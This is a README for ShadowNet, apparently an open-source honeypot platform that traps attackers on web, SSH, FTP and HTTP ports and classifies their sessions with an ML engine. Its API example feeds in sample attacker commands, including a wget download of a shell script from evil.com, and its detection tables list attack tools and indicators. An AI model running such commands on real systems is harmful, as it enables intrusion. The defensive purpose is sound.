<div align="center">

# 🛡️ ShadowNet
### **Adaptive AI-Powered Deception & Threat Intelligence Platform**

> *Trap attackers. Classify threats. Study adversaries — in real time.*

[![Python](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/)
[![FastAPI](https://img.shields.io/badge/framework-FastAPI-009688.svg)](https://fastapi.tiangolo.com/)
[![SQLite](https://img.shields.io/badge/database-SQLite-003B57.svg)](https://sqlite.org/)
[![WebSockets](https://img.shields.io/badge/realtime-WebSockets-black.svg)](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API)
[![License: MIT](https://img.shields.io/badge/license-MIT-purple.svg)](./LICENSE)

**[🔴 Live Demo — Deception Portal](#)** • **[📊 Threat Dashboard](#)** • **[📖 Docs](#architecture)**

</div>

---

## 🎯 What Is ShadowNet?

Most honeypots just log IPs. **ShadowNet goes further.**

It is a full-stack deception platform that lures attackers into an emulated environment, captures every action they take, and uses a **behavioral ML engine** to classify *who* they are — scanner, bot, script kiddie, or Advanced Persistent Threat — all in real time.

Security teams get a live SOC-style dashboard. Attackers get a convincing fake system. Nobody notices the trap until it's too late.

---

## 🔥 Core Capabilities

### 1. 🧠 Behavioral Attacker Classification (ML Engine)
ShadowNet doesn't just log — it **understands**. The `BehavioralAnalysisEngine` (`analysis.py`) scores every session across multiple dimensions:

| Attacker Type | Signals |
|---|---|
| **ADVANCED_THREAT** | Risk score ≥ 10, multi-tool usage (3+), complex multi-stage commands |
| **AUTOMATED_BOT** | Command interval < 0.2s, `wget`/`curl` payload downloads, zero typing variance |
| **EXPLORATORY** | Recon commands (`whoami`, `id`, `cat /etc/passwd`), low risk score |
| **BENIGN** | No threat indicators detected |

The engine tracks tool usage (`nmap`, `nc`, `gcc`, `python`, `perl`...), command timing intervals, exploit pattern sequences (`chmod +x`, `rm -rf`), and reconnaissance signatures — all streamed live.

### 2. 🪤 Multi-Protocol Honeypot Engine (`main.py`)
Three concurrent traps run simultaneously:

- **FastAPI Web Honeypot** (Port 8000) — SSO login portal with fake admin panels, session sandbox, SQLi/XSS/brute-force trap detection
- **SSH Honeypot** (Paramiko, Port 2222) — Emulates a real SSH server; every command executed inside is captured and analyzed
- **FTP Honeypot** (pyftpdlib, Port 2121) — Exposes fake `admin:12345` credentials over a real FTP server
- **HTTP Honeypot** (stdlib HTTPServer, Port 8080) — Generic HTTP surface to catch automated scanners

All four feed events into a unified pipeline via the **log watcher** module.

### 3. 📡 Real-Time WebSocket Feed
Every attacker action is broadcast live to connected SOC dashboards via `/ws/feed`. The dashboard renders command histories, threat classifications, and geographic telemetry as events happen — zero page refreshes, zero polling.

### 4. 🌐 Live Threat Intelligence Dashboard
A unified SOC interface at `/dashboard` shows:
- Active sessions with real-time classification updates
- Per-session command history and risk scores
- System-wide stats (total sessions, total commands captured)
- Session replay for forensic analysis
- ML feature vector breakdown per attacker

### 5. 📄 Automated PDF Forensic Reports
Analysts can generate a structured forensic report for any session via:
```
GET /api/sessions/{session_id}/report
```
Returns a downloadable PDF summarizing session timeline, commands, classification, and risk analysis.

### 6. 🎥 Session Replay (rrweb Integration)
Browser-based attacker sessions are recorded via `rrweb` event streams. Every click, keystroke, and navigation is captured and replayable for post-incident analysis.

### 7. 🤖 AI-Powered Analysis (Groq / LLaMA 3.3)
ShadowNet integrates with **Groq's API** using `llama-3.3-70b-versatile` for deeper natural language analysis of attacker sessions. Configured via `.env`:
```env
GROQ_API_KEY=your_key_here
GROQ_MODEL=llama-3.3-70b-versatile
```

### 8. 🐳 Docker Sandbox Isolation
Attacker sessions can be routed into isolated **Docker containers** (`ubuntu:22.04`) to safely emulate a real Linux environment. The `docker` Python SDK (`docker>=6.1`) manages container lifecycle. Configured via:
```env
DOCKER_SANDBOX_IMAGE=ubuntu:22.04
```

### 9. 🗺️ Geographic Threat Mapping (GeoIP)
Every attacker IP is geolocated using the **MaxMind GeoLite2 City database** (`GeoLite2-City.mmdb`), enabling the dashboard to plot attack origins on a world map in real time.

---

## 🏗️ Architecture

```
┌──────────────────────────────────────────────────────────────────────────┐
│                          ATTACKER SURFACE                                │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌──────────────┐   │
│  │  Web Trap   │  │  SSH Trap   │  │  FTP Trap   │  │  HTTP Trap   │   │
│  │  Port 8000  │  │  Port 2222  │  │  Port 2121  │  │  Port 8080   │   │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘  └──────┬───────┘   │
└─────────┼────────────────┼────────────────┼────────────────┼────────────┘
          │                 │                 │                │
          └─────────────────┴─────────────────┴────────────────┘
                                      │
                     ┌────────────────────┐
                     │    Log Watcher     │  ← modules/log_watcher.py
                     │   + Cowrie Logs    │
                     └─────────┬──────────┘
                               │ events
                ┌───────────▼───────────┐
                │  BehavioralAnalysis   │  ← analysis.py
                │      Engine           │
                └───────────┬───────────┘
                            │ classifications
          ┌─────────────────▼─────────────────┐
          │          FastAPI Core              │  ← main.py
          │   /api/sessions  /api/classify     │
          │   /api/stats     /api/web-event    │
          │   /ws/feed (WebSocket broadcast)   │
          └─────────────────┬─────────────────┘
                            │
                  ┌─────────▼──────────┐
                  │   SQLite Database  │  ← config.DB_PATH
                  │  sessions/commands │
                  └────────────────────┘
                            │
              ┌─────────────▼─────────────┐
              │    SOC Dashboard UI        │  ← /static/dashboard.html
              │  Real-time via WebSocket   │
              └────────────────────────────┘
```

---


---

## 🛠️ Quick Start

### Prerequisites
- Python 3.11+
- pip

### 1. Clone & Install
```bash
git clone https://github.com/SuhasHanamannavar/shadownet.git
cd shadownet
pip install -r requirements.txt
```

### 2. Configure Environment
```bash
cp .env.example .env   # or create .env manually
```
Key variables:
```env
GROQ_API_KEY=your_groq_key_here
GROQ_MODEL=llama-3.3-70b-versatile
GEOIP_DB_PATH=./data/GeoLite2-City.mmdb
DOCKER_SANDBOX_IMAGE=ubuntu:22.04
```

### 3. Launch ShadowNet
```bash
python main.py
```

This starts all four honeypot services simultaneously:
- 🌐 Web portal + API: `http://localhost:8000`
- 🔒 SSH trap: port `2222`
- 🔌 FTP trap: port `2121`
- 📡 HTTP trap: port `8080`

### 4. Open the Dashboard
Navigate to `http://localhost:8000/dashboard` to watch live threat classifications stream in.

### 5. Test the Classifier
Open `http://localhost:8000/test` to manually submit command sequences and see the ML engine classify them in real time — including the full 22-feature vector breakdown.

---

## 🔌 API Reference

| Endpoint | Method | Description |
|---|---|---|
| `/api/status` | GET | Backend health check |
| `/api/sessions` | GET | All captured sessions with classifications |
| `/api/live-sessions` | GET | Currently active sessions |
| `/api/stats` | GET | Total session and command counts |
| `/api/classify` | POST | Classify a command sequence on demand |
| `/api/web-event` | POST | Inject a web attacker event |
| `/api/rrweb` | POST | Submit browser session replay events |
| `/api/demo` | GET/POST | Trigger a demo attack event |
| `/api/sessions/{id}/report` | GET | Download PDF forensic report |
| `/ws/feed` | WebSocket | Live event broadcast stream |
| `/api/system/os` | GET | Emulated OS fingerprint |

### Example: Live Classification
```bash
curl -X POST http://localhost:8000/api/classify \
  -H "Content-Type: application/json" \
  -d '{
    "commands": ["whoami", "cat /etc/passwd", "wget http://evil.com/shell.sh", "chmod +x shell.sh"],
    "timings": [0.1, 0.1, 0.1, 0.1],
    "src_ip": "192.168.1.100"
  }'
```

**Response:**
```json
{
  "classification": {
    "type": "AUTOMATED_BOT",
    "confidence": 0.91,
    "reasoning": "Fast command execution, payload download detected"
  },
  "features": {
    "recon%": 0.25,
    "download%": 0.25,
    "exec%": 0.25,
    "mean_gap": 0.1,
    "burst_ratio": 1.0
  }
}
```

---

## 🧪 ML Feature Engineering

The `feature_extractor.py` module extracts a **22-dimensional feature vector** from each session:

| Feature Group | Features |
|---|---|
| **Command Intent %** | recon, download, exec, lateral_movement, destructive, auth, misc |
| **Session Statistics** | total_cmds, unique_cmds, entropy, max_cmd_len, mean_cmd_len |
| **Timing Patterns** | mean_gap, std_gap, min_gap, max_gap, burst_ratio |
| **Threat Indicators** | has_sudo, has_privesc, has_pyexec, has_encoded, has_redirect |

These features feed a trained **Scikit-Learn classifier** (`model.pkl`) for session-level prediction, with heuristic fallback logic in `analysis.py` for real-time streaming classification before a session ends.

---

## 🌍 Real-World Impact

ShadowNet addresses a critical gap in cyber threat intelligence:

- **94% of cyberattacks** begin with reconnaissance that most honeypots log but never analyze
- Traditional IDS tools create alert fatigue — ShadowNet **prioritizes** by classifying attacker sophistication
- Security researchers can study **live attacker TTPs** (Tactics, Techniques, Procedures) without exposing real systems
- Exportable forensic reports enable **incident response teams** to act on intelligence, not just raw logs

---

## 🛡️ Ethical Use

ShadowNet is built for:
- ✅ Cybersecurity research and threat intelligence
- ✅ Academic study of attacker behavior
- ✅ Enterprise deception defense deployments
- ✅ CTF (Capture The Flag) environments
- ❌ **Not for offensive use.** Do not deploy against systems you do not own or have explicit permission to monitor.

---

---

## 📄 License

MIT License — open for research, education, and defensive security use.

---

<div align="center">

**⭐ Star this repo if ShadowNet helped you understand attacker behavior.**

*Built with 🛡️ for the defender community.*

</div>
